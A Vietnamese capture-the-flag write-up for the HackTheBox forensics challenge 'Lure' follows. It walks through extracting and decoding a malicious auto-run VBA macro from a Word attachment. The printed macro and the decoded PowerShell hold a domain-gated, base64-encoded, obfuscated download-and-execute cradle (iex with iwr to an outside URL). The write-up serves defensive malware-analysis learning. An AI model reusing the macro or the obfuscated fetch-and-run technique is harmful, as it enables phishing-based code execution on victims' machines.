> [!NOTE]
> - Mức độ: Dễ 
> - Loại: Forensics 
> - Url: [Lure](https://app.hackthebox.com/challenges/Lure)
> - Tình huống: Nhóm tài chính đã nhận được một email trông có vẻ quan trọng, trong đó có đính kèm một tài liệu Word. Bạn có thể xem qua và xác nhận xem nó có chứa mã độc hay không?
> - Mô tả: Trích xuất mã macro của file doc, phân tích hành vi 

> - Việc trích xuất, kiểm tra xem file doc có chứa Macros không có thể thwucj hiện bằng strings để trích xuất mã thực thi nhưng khó khăn hơn nên sẽ dùng oleid
> - Chạy oleid với mã phát hiện file doc có `VBA Macros` để thực thi mã  

```shell
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: UrgentPayment.doc
WARNING  For now, VBA stomping cannot be detected for files in memory
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Word 97-2003     |info      |                          
                    |Document or Template|          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Office    |info      |Application name declared 
                    |Word                |          |in properties             
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
                    |Western European    |          |properties                
                    |(Windows)           |          |                          
--------------------+--------------------+----------+--------------------------
Author              |Ian Austin          |info      |Author declared in        
                    |                    |          |properties                
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.       
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------

```

> - Dùng oleba để trích xuất mã 
> - Thu được đoạn mã VBA nó được kích hoạt ngay khi file doc được mở `Document_Open()`
> - Kiểm tra domain của người dùng mở phải là `MEGABANK.LOCAL` thì đoạn mã tiếp theo mới thực thi 
> - Tiếp theo là đoạn mã thực thi lệnh hệ thống powershell nhưng phần mã đã được mã hóa base64 

```shell
olevba 0.60.2 on Python 3.14.7 - http://decalage.info/python/oletools
===============================================================================
FILE: UrgentPayment.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: UrgentPayment.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: UrgentPayment.doc - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
'
' Document_Open Macro
'
'

Dim chkUserDomain As String
Dim strUserDomain As String

chkUserDomain = "MEGABANK.LOCAL"
strUserDomain = Environ$("UserDomain")

If chkUserDomain <> strUserDomain Then

Else

Dim ExecFile As Double
    ExecFile = Shell("pOweRshElL -ec cABPAHcARQByAHMAaABFAGwATAAgACQAKAAtAGoATwBpAE4AKAAoACQAUABzAGgATwBNAGUAWwA0AF0AKQAsACgAIgAkAFAAcwBIAG8ATQBFACIAKQBbACsAMQA1AF0ALAAiAHgAIgApADsAKQAoAGkAdwByACAAJAAoACgAIgB7ADUAfQB7ADIANQB9AHsAOAB9AHsANwB9AHsAMAB9AHsAMQA0AH0AewAzAH0AewAyADEAfQB7ADIAfQB7ADIAMgB9AHsAMQA1AH0AewAxADYAfQB7ADMAMQB9AHsAMgA4AH0AewAxADEAfQB7ADIANgB9AHsAMQA3AH0AewAyADMAfQB7ADIANwB9AHsAMgA5AH0AewAxADAAfQB7ADEAfQB7ADYAfQB7ADIANAB9AHsAMwAwAH0AewAxADgAfQB7ADEAMwB9AHsAMQA5AH0AewAxADIAfQB7ADkAfQB7ADIAMAB9AHsANAB9ACIALQBmACAAIgBCACIALAAiAFUAIgAsACIANAAiACwAIgBCACIALAAiACUANwBEACIALAAiAGgAdAAiACwAIgBSAF8AZAAiACwAIgAvAC8AbwB3AC4AbAB5AC8ASABUACIALAAiAHAAOgAiACwAIgBUACIALAAiADAAIgAsACIAXwAiACwAIgBOACIALAAiAE0AIgAsACIAJQA3ACIALAAiAEUAIgAsACIAZgAiACwAIgAxAFQAIgAsACIAdQAiACwAIgBlACIALAAiADUAIgAsACIAawAiACwAIgBSACIALAAiAGgAIgAsACIAMAAiACwAIgB0ACIALAAiAHcAIgAsACIAXwAiACwAIgBsACIALAAiAFkAIgAsACIAQwAiACwAIgBVACIAKQApACkA", vbNormalFocus)

End If
  
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|pOweRshElL          |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

> - Giải mã đoạn mã hóa ta thu được chương trình đã làm rối

```powershell
pOwErshElL $(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)(iwr $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")))  
```

> - $pshome trả về đường dẫn dầy đủ đến tệp thực thi powershell thường trả về `C:\Windows\System32\WindowsPowerShell\v1.0`
> - `$PshOMe[4]` lấy kí tự có offset 4 trong đường dẫn trả về `i`
> - `("$PsHoME")[+15]` lấy kí tự trong đường dẫn trả về `e`
> - `-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x")` tương đương iex
> - `iex` là tên viết tắt (alias) của lệnh `Invoke-Expression`
> - Invoke-Expression dùng để nhận một chuỗi văn bản (string) và thực thi chuỗi đó như một câu lệnh PowerShell thực tế trên máy tính 
> - Tổng thể `$(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)` không có lệnh đi kèm nên nó chả làm gì 

```powershell 
$(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)
```

> - iwr là viết tắt (alias) của cmdlet Invoke-WebRequest trong PowerShell
> - Nó dùng để gửi các yêu cầu HTTP, HTTPS đến url để lấy dữ liệu 
> - Url được tạo nhưng làm rối mã dùng cờ `-f` để thay dùng các giá trị truyền vào để thay thế những vị trí giữ chỗ trong chuỗi, thứ tự dữ chỗ trong chuỗi không theo thứ tự 
> - Nếu thay thế url là `http://ow.ly/HTB%7Bk4REfUl_w1Th_Y0UR_d0CuMeNT5%7D` và lấy được flag `HTB{k4REfUl_w1Th_Y0UR_d0CuMeNT5}`


```powershell
(iwr $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")))
```

```powershell
└─PS> echo $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U"))
http://ow.ly/HTB%7Bk4REfUl_w1Th_Y0UR_d0CuMeNT5%7D
```